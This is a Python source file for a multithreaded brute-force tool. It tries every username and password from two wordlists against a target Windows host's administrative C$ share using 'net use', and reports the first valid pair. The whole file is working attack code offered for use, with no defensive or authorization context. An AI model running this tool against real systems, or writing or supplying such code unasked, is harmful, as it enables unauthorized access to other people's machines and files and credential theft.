import subprocess
import threading
from queue import Queue
from tqdm import tqdm
from utils import color_text, Colors

def brute_force(ip, userlist, passlist, threads=10):
    try:
        with open(userlist, 'r', encoding='utf-8') as f:
            usernames = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(color_text(f"[-] Username wordlist not found: {userlist}", Colors.RED))
        return None, None
    
    try:
        with open(passlist, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(color_text(f"[-] Password wordlist not found: {passlist}", Colors.RED))
        return None, None
    
    if not usernames or not passwords:
        print(color_text("[-] Wordlists are empty.", Colors.RED))
        return None, None
    
    print(color_text(f"[+] Loaded {len(usernames)} usernames and {len(passwords)} passwords.", Colors.GREEN))
    print(color_text(f"[+] Total combinations: {len(usernames) * len(passwords)}", Colors.GREEN))
    print(color_text(f"[+] Using {threads} threads.", Colors.BLUE))
    
    q = Queue()
    found = False
    found_creds = None
    
    for username in usernames:
        for password in passwords:
            q.put((username, password))
    
    total = q.qsize()
    progress_bar = tqdm(total=total, desc="Brute forcing", unit="attempts", dynamic_ncols=True, colour="green")
    
    def worker():
        nonlocal found, found_creds
        while not q.empty() and not found:
            try:
                username, password = q.get(timeout=1)
            except:
                break
            
            result = subprocess.run(
                ['net', 'use', 'Z:', f'\\\\{ip}\\C$', f'/user:{username}', password],
                capture_output=True, text=True
            )
            
            progress_bar.update(1)
            
            if result.returncode == 0:
                found = True
                found_creds = (username, password)
                print(color_text(f"\n[+] SUCCESS! Valid credentials found: {username}:{password}", Colors.GREEN))
                subprocess.run(['net', 'use', 'Z:', '/delete'], capture_output=True, text=True)
                break
            
            subprocess.run(['net', 'use', 'Z:', '/delete'], capture_output=True, text=True)
            q.task_done()
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join(timeout=1)
    
    progress_bar.close()
    
    if not found:
        print(color_text("\n[-] No valid credentials found.", Colors.RED))
        return None, None
    
    return found_creds